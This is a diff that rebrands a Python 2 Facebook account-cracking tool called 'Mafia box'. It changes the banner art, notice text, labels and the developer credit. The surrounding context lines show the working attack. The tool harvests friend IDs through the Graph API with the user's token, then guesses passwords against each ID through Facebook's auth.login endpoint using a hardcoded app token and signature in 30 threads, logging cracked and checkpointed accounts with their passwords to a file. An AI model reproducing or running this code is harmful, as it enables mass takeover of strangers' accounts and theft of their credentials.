@@ -52,11 +52,17 @@ def jalan(z):
 ##### LOGO #####
 logo = """
                              🅼🅰🅵🅸🅰 🅱🅾🆇=2
-      \033[1;91m:  ▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒ :
-      \033[1;92m:  ▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒ :
-      \033[1;93m:  ▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒ :
-      \033[1;94m:  ▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒ :
-      \033[1;95m:  ▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒ : 
+      \033[1;91m:                                                    :
+      \033[1;92m:                    
+
+                        ╭━━━┳━━━┳━━━╮╭╮
+                        ┃╭━╮┃╭━╮┃╭━╮┣╯┃
+                        ╰╯╭╯┃┃┃┃┣╯╭╯┣╮┃
+                        ╭━╯╭┫┃┃┃┣━╯╭╯┃┃
+                        ┃┃╰━┫╰━╯┃┃╰━┳╯╰╮                                :
+      \033[1;93m:                                                    :
+      \033[1;94m:                                                    :
+      \033[1;95m:                                                    : 
       \033[1;96m:  ▒▒▒▒▒▒▒▒▒▇🄵🄰🄲🄴🄱🄾🄾🄺▇▒▒▒▒▒▒▒▒▒▒▒▒ :
       \033[1;91m:  ▒▒▒▒▒▒▒▒▒▒▂▇🄺🄸🄽🄶▇▂▒▒▒▒▒▒▒▒▒▒▒▒▒ :
  @@@@@   \033[1;91m: 🅼🅰🅵🅸🅰 🅱🅾🆇=2    @@@@@                                   @@@@@@
@@ -151,7 +157,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;92m     Notice:☞ \033[1;93mStay Home Stay Safe Save lives Save Pakistan' )
+		jalan(' \033[1;92m     Notice:☞ \033[1;93mStay Home Stay Safe Save lives Save Bangladesh' )
                 jalan(' \033[1;92m     Notice:☞ \033[1;97mPray NAMAZ five time Daily' )
                 jalan(' \033[1;92m     Notice:☞ \033[1;97mwear mask on your mouth every time ' )
                 jalan(' \033[1;92m     Notice:☞ \033[1;97mDont go to in markets ' )
@@ -159,7 +165,7 @@ def login():
 		print "\033[1;95m      ▒▒▒▒▒▒▒▒▒▒▒▒•◈•\033[1;96mBlackMafia\033[1;95m•◈•▒▒▒▒▒▒▒▒▒▒▒▒"
 		print('\033[1;93m▒▒▒▒▒▒▒▒▒▒▒▒LOGIN WITH FACEBOOK▒▒▒▒▒▒▒▒▒▒▒▒' )
 		print('	' )
-		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
+		id = raw_input('\033[1;96m[+] \x1b[1;92mID/faceook-Email\x1b[1;95m: \x1b[1;96m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
 		tik()
 		try:
@@ -282,7 +288,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒\033[1;96mBlackMafia\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒"
+		print "\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒\033[1;96mMafia box=2 \033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒"
 		jalan('\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -291,7 +297,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID link\033[1;93m: \033[1;97m")
+		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID code\033[1;93m: \033[1;97m")
 		print "\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒\033[1;96mBlackMafia\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -329,7 +335,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #mafia:love_hacker
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -393,11 +399,11 @@ def pilih_super():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\x1b[1;92m☞{Hack}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass5
+												print '\x1b[1;92m☞{login}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass5
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;95m☞{CP}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass5
+													print '\x1b[1;95m☞{ofline}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass5
 													cek = open("out/checkpoint.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -440,7 +446,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒\033[1;96mMafiabox2\033[1;95m▒▒▒▒▒▒▒▒▒▒▒▒•◈•▒▒▒▒▒▒▒▒▒▒▒▒"
-	print "  \033[1;91m«---•◈•---Developed By love-hacker--•◈•---»" #Dev:love_hacker
+	print "  \033[1;91m«---•◈•---Developed By Md Suman Hossain--•◈•---»" #mafia:love_hacker
 	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;94m"+str(len(cekpoint))
 	print """
